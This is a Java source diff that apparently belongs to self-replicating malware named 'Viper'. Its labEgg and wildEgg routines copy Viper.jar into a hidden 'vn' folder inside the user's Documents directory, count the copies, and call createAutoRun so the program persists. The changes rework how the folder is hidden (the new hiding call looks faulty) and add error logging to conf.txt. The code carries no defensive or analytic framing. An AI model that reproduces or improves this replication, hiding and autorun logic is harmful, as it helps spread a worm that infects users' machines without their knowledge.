@@ -5,6 +5,7 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.file.Files;
+import java.nio.file.LinkOption;
 import java.nio.file.Path;
 import java.nio.file.StandardCopyOption;
 
@@ -26,11 +27,13 @@ public static void labEgg(Path vPath,int unitNumber){
 			 userCP=users.getCanonicalPath();
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
+			error=error+" first canpath "+ e.getLocalizedMessage();
 			e.printStackTrace();
 		}
 		String usePath= createFilePath(userCP,true);
 		createCopy(usePath,vPath,true);
 		copyMode(usePath);
+		outError(vPath);
 	}
 
 }
@@ -54,34 +57,36 @@ public static void wildEgg(Path vPath,int unitNumber){
 public static String createFilePath(String userPath, boolean lab){
 	File doc= new File(userPath+"/Documents");
 	if(doc.exists()==false){
-		doc=new File(userPath+"/My Documents");
+		doc=new File(userPath+"/"+System.getProperty("user.name")+"/My Documents");
 	}
 	String docCP=doc.getAbsolutePath();
 	try {
 		docCP = doc.getCanonicalPath();
 	} catch (IOException e1) {
 		// TODO Auto-generated catch block
-		error= error+ " canonicalPath1";
+		error= error+ " canonicalPath1 "+e1.getLocalizedMessage();
 		e1.printStackTrace();
 	}
 	File uP=new File(docCP+"/vn");
 	if(uP.exists()==false){
-		try {
-			uP.createNewFile();
-		} catch (IOException e) {
-			System.out.println("interfearence");
-			error=error+" can't create new file";
-			e.printStackTrace();
-		}
+		
+			if( uP.mkdir()==true){
+				error=error+" directory vn created ";
+			}else{
+				error=error+" directory vn not created ";
+			}
+		 
+		
 		
 	}
-	if(uP.isHidden()==false&& lab==false){
+	if(uP.isHidden()==false){
 		
 		try {
-			Runtime.getRuntime().exec("attrib +H "+uP.getCanonicalPath());
+			
+			Files.setAttribute(uP.toPath(),"dos:hidden", uP.isHidden(), LinkOption.NOFOLLOW_LINKS);
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
-			error=error+" can't hide file";
+			error=error+" can't hide file "+e.getLocalizedMessage();
 			e.printStackTrace();
 		}
 	}
@@ -90,7 +95,7 @@ public static String createFilePath(String userPath, boolean lab){
 		uPCP = uP.getCanonicalPath();
 	} catch (IOException e) {
 		// TODO Auto-generated catch block
-		error= error+ " canonicalPath2";
+		error= error+ " canonicalPath2 "+e.getLocalizedMessage();
 		e.printStackTrace();
 	}
 	return uPCP ;
@@ -99,20 +104,10 @@ public static String createFilePath(String userPath, boolean lab){
 public static void createCopy(String filePath,Path vPath,boolean lab){
 	File nestLocation=new File(filePath);
 	Identification nVID=new Identification();
+	File vLocation= new File(vPath.toString()+"/Viper.jar");
+	File vTarget= new File(filePath+"/Viper.jar");
 	try{
-		if(lab==true){ 
-		File conf= new File(vPath+"/conf.txt");
-		 if(conf.exists()==false){
-			 conf.createNewFile();
-		 }
-		 FileWriter fw;
-		 fw = new FileWriter(conf.getAbsolutePath());
-		 BufferedWriter writing= new BufferedWriter(fw);
 		
-				writing.write(error);
-				writing.newLine();
-				 writing.close();
-				}
 			   
 		
 		
@@ -120,7 +115,11 @@ public static void createCopy(String filePath,Path vPath,boolean lab){
 		
 			
 		 if(!nestLocation.exists()){
-			 nestLocation.createNewFile();
+			if( nestLocation.mkdir()==true){
+				error=error+" directory vn created ";
+			}else{
+				error=error+" directory vn not created ";
+			}
 		 
 		createAutoRun(lab,filePath);
 		
@@ -132,13 +131,16 @@ public static void createCopy(String filePath,Path vPath,boolean lab){
 		 }
 	nVID.saveInfo(unitNum++, 0, nestLocation);
 	try {
-		File vF=new File(filePath+"/Viper.java");
+		File vF=new File(filePath+"/Viper.jar");
 		if(vF.exists()==false){
 			unitCopys++;
-		Files.copy(vPath, nestLocation.toPath(), StandardCopyOption.REPLACE_EXISTING);
+		
+		
+		Files.copy(vLocation.toPath() ,vTarget.toPath());
 		}
 	} catch (IOException e) {
 		// TODO Auto-generated catch block
+		error=error+" cant copy "+ e.getLocalizedMessage()+" ";
 		e.printStackTrace();
 	}
 
@@ -159,6 +161,26 @@ public static void copyMode(String filePath){
 public static int getUnitsCreated(){
 	return unitCopys;
 	
+}
+public static void outError(Path vPath){
+	 
+	File conf= new File(vPath+"/conf.txt");
+	try{
+	 if(conf.exists()==false){
+		 conf.createNewFile();
+	 }
+	 FileWriter fw;
+	 fw = new FileWriter(conf.getAbsolutePath());
+	 BufferedWriter writing= new BufferedWriter(fw);
+	
+			writing.write(error);
+			writing.newLine();
+			 writing.close();
+	 }
+	 catch(IOException e){
+	 System.out.println( "Error: "+ e.toString());
+	 }
+			
 }
 public static void createAutoRun(boolean lab, String filePath) throws IOException{
 	FileWriter fw;
